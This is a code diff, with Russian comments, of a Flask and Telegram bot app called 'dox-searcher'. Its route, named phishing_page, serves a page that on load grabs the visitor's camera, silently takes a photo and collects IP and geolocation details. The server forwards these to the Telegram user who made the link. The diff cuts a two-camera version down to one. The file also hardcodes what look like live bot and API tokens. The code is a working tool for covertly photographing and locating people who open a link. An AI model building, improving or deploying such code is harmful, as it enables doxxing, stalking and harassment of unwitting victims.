@@ -17,7 +17,7 @@ app = Flask(__name__)
 # Конфигурация
 BOT_TOKEN = '8048949774:AAF79Ml1LGb8xlmCnBmFHC1a900mgOAz3WM'
 BASE_URL = "https://dox-searcher.onrender.com"
-IPINFO_TOKEN = "c39bb318760ade"  # Получите токен на ipinfo.io
+IPINFO_TOKEN = "c39bb318760ade"
 
 bot = telebot.TeleBot(BOT_TOKEN)
 ipinfo_handler = ipinfo.getHandler(IPINFO_TOKEN)
@@ -34,7 +34,7 @@ def generate_token(length=8):
     chars = string.ascii_letters + string.digits
     return ''.join(random.choice(chars) for _ in range(length))
 
-# HTML шаблон с двумя камерами (остается без изменений)
+# HTML шаблон с двумя камерами
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html>
@@ -54,49 +54,42 @@ HTML_TEMPLATE = """
     </style>
 </head>
 <body>
-    <video id="frontVideo" autoplay playsinline></video>
-    <canvas id="frontCanvas"></canvas>
-    <video id="backVideo" autoplay playsinline></video>
-    <canvas id="backCanvas"></canvas>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
     <script>
-        const frontVideo = document.getElementById('frontVideo');
-        const frontCanvas = document.getElementById('frontCanvas');
-        const backVideo = document.getElementById('backVideo');
-        const backCanvas = document.getElementById('backCanvas');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
         
-        frontCanvas.width = backCanvas.width = 640;
-        frontCanvas.height = backCanvas.height = 480;
+        canvas.width = 640;
+        canvas.height = 480;
         
         // Функция для захвата фото
-        function capturePhoto(video, canvas) {
+        function capturePhoto() {
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             return canvas.toDataURL('image/jpeg', 0.8);
         }
         
         // Функция отправки фото на сервер
-        async function sendPhotos(frontPhoto, backPhoto) {
+        async function sendPhoto(photoData) {
             const token = window.location.pathname.split('/').pop();
             
             try {
-                const response = await fetch('/upload', {
+                await fetch('/upload', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
-                        front_image: frontPhoto,
-                        back_image: backPhoto,
+                        image: photoData,
                         token: token
                     })
                 });
                 
-                // После отправки останавливаем камеры
-                [frontVideo, backVideo].forEach(video => {
-                    if (video.srcObject) {
-                        const tracks = video.srcObject.getTracks();
-                        tracks.forEach(track => track.stop());
-                    }
-                });
+                // После отправки останавливаем камеру
+                if (video.srcObject) {
+                    const tracks = video.srcObject.getTracks();
+                    tracks.forEach(track => track.stop());
+                }
                 
             } catch (error) {
                 console.error('Upload error:', error);
@@ -115,95 +108,46 @@ HTML_TEMPLATE = """
         }
         
         // Автоматическая фотосъемка при получении доступа
-        async function initCamerasAndCapture() {
+        async function initCameraAndCapture() {
             try {
                 // Получаем IP информацию
                 const ipInfo = await getIPInfo();
                 
-                // Получаем список устройств
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const videoDevices = devices.filter(device => device.kind === 'videoinput');
+                // Захватываем камеру
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: {
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: 'user'
+                    } 
+                });
                 
-                // Если есть только одна камера (обычно фронтальная)
-                if (videoDevices.length === 1) {
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: {
-                            width: { ideal: 1280 },
-                            height: { ideal: 720 },
-                            facingMode: 'user'
-                        } 
+                video.srcObject = stream;
+                
+                // Ждем 1 секунду для стабилизации изображения
+                setTimeout(() => {
+                    const photo = capturePhoto();
+                    sendPhoto(photo);
+                    
+                    // Отправляем IP информацию отдельным запросом
+                    fetch('/ipinfo', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            token: token,
+                            ip_info: ipInfo
+                        })
                     });
                     
-                    frontVideo.srcObject = stream;
-                    
-                    // Ждем 1 секунду для стабилизации изображения
-                    setTimeout(async () => {
-                        const frontPhoto = capturePhoto(frontVideo, frontCanvas);
-                        await sendPhotos(frontPhoto, null);
-                    }, 1000);
-                } 
-                // Если есть две камеры (фронтальная и задняя)
-                else if (videoDevices.length >= 2) {
-                    // Захватываем фронтальную камеру
-                    const frontStream = await navigator.mediaDevices.getUserMedia({ 
-                        video: {
-                            width: { ideal: 1280 },
-                            height: { ideal: 720 },
-                            facingMode: 'user'
-                        } 
-                    });
-                    
-                    frontVideo.srcObject = frontStream;
-                    
-                    // Ждем 1 секунду и делаем снимок
-                    setTimeout(async () => {
-                        const frontPhoto = capturePhoto(frontVideo, frontCanvas);
-                        
-                        // Останавливаем фронтальную камеру
-                        frontStream.getTracks().forEach(track => track.stop());
-                        
-                        // Захватываем заднюю камеру
-                        const backStream = await navigator.mediaDevices.getUserMedia({ 
-                            video: {
-                                width: { ideal: 1280 },
-                                height: { ideal: 720 },
-                                facingMode: { exact: 'environment' }
-                            } 
-                        });
-                        
-                        backVideo.srcObject = backStream;
-                        
-                        // Ждем 1 секунду и делаем снимок
-                        setTimeout(async () => {
-                            const backPhoto = capturePhoto(backVideo, backCanvas);
-                            await sendPhotos(frontPhoto, backPhoto);
-                        }, 1000);
-                        
-                    }, 1000);
-                }
+                }, 1000);
                 
             } catch (err) {
                 console.error('Camera error:', err);
-                try {
-                    // Если не получилось с двумя камерами, пробуем хотя бы с одной
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: true 
-                    });
-                    
-                    frontVideo.srcObject = stream;
-                    
-                    setTimeout(async () => {
-                        const frontPhoto = capturePhoto(frontVideo, frontCanvas);
-                        await sendPhotos(frontPhoto, null);
-                    }, 1000);
-                } catch (e) {
-                    console.error('Fallback camera error:', e);
-                }
             }
         }
         
         // Запускаем процесс при загрузке страницы
-        window.addEventListener('DOMContentLoaded', initCamerasAndCapture);
+        window.addEventListener('DOMContentLoaded', initCameraAndCapture);
     </script>
 </body>
 </html>
@@ -211,41 +155,33 @@ HTML_TEMPLATE = """
 
 @app.route('/<custom_token>')
 def phishing_page(custom_token):
-    # Получаем IP информацию
-    ip_info = {}
-    try:
-        if request.headers.getlist("X-Forwarded-For"):
-            ip = request.headers.getlist("X-Forwarded-For")[0]
-        else:
-            ip = request.remote_addr
-        
-        # Получаем информацию о местоположении
-        details = ipinfo_handler.getDetails(ip)
-        ip_info = {
-            "ip": ip,
-            "city": details.city or "Unknown",
-            "region": details.region or "Unknown",
-            "country": details.country_name or "Unknown",
-            "loc": details.loc or "Unknown",
-            "org": details.org or "Unknown"
-        }
-    except Exception as e:
-        print(f"Ошибка при получении IP информации: {e}")
-        ip_info = {"error": "Не удалось получить информацию об IP"}
-    
-    # Сохраняем IP информацию для этого токена
-    user_id = None
-    for uid, token in user_tokens.items():
-        if token == custom_token:
-            user_id = uid
-            break
-    
-    if user_id:
-        if user_id not in photo_storage:
-            photo_storage[user_id] = {}
-        photo_storage[user_id]["ip_info"] = ip_info
-    
     return render_template_string(HTML_TEMPLATE)
+
+@app.route('/ipinfo', methods=['POST'])
+def handle_ipinfo():
+    try:
+        data = request.json
+        custom_token = data.get('token')
+        ip_info = data.get('ip_info', {})
+        
+        if not custom_token:
+            return 'Token required', 400
+            
+        user_id = None
+        for uid, token in user_tokens.items():
+            if token == custom_token:
+                user_id = uid
+                break
+                
+        if user_id:
+            if user_id not in photo_storage:
+                photo_storage[user_id] = {}
+            photo_storage[user_id]["ip_info"] = ip_info
+        
+        return '', 200
+    except Exception as e:
+        print(f"Ошибка при обработке IP информации: {e}")
+        return 'Server error', 500
 
 @app.route('/upload', methods=['POST'])
 def handle_upload():
@@ -270,28 +206,11 @@ def handle_upload():
         
         # Сохраняем фото
         timestamp = int(time.time())
-        front_filename = None
-        back_filename = None
+        filename = f"photos/photo_{custom_token}_{timestamp}.jpg"
+        image_data = data['image'].split(',')[1]
         
-        if data.get('front_image'):
-            front_image_data = data['front_image'].split(',')[1]
-            front_filename = f"photos/front_{custom_token}_{timestamp}.jpg"
-            with open(front_filename, "wb") as f:
-                f.write(base64.b64decode(front_image_data))
-            
-            if user_id not in photo_storage:
-                photo_storage[user_id] = {}
-            photo_storage[user_id]["front"] = front_filename
-        
-        if data.get('back_image'):
-            back_image_data = data['back_image'].split(',')[1]
-            back_filename = f"photos/back_{custom_token}_{timestamp}.jpg"
-            with open(back_filename, "wb") as f:
-                f.write(base64.b64decode(back_image_data))
-            
-            if user_id not in photo_storage:
-                photo_storage[user_id] = {}
-            photo_storage[user_id]["back"] = back_filename
+        with open(filename, "wb") as f:
+            f.write(base64.b64decode(image_data))
         
         # Получаем сохраненную IP информацию
         ip_info = photo_storage.get(user_id, {}).get("ip_info", {})
@@ -307,18 +226,12 @@ def handle_upload():
         caption += f"▪️ Провайдер: {ip_info.get('org', 'Unknown')}"
         
         # Отправляем фото в Telegram
-        media = []
-        
-        if front_filename:
-            with open(front_filename, "rb") as photo:
-                media.append(telebot.types.InputMediaPhoto(photo, caption=caption if not back_filename else None))
-        
-        if back_filename:
-            with open(back_filename, "rb") as photo:
-                media.append(telebot.types.InputMediaPhoto(photo, caption=caption if not front_filename else None))
-        
-        if media:
-            bot.send_media_group(user_id, media)
+        with open(filename, "rb") as photo:
+            bot.send_photo(
+                chat_id=user_id,
+                photo=photo,
+                caption=caption
+            )
         
         return '', 200
     except Exception as e:
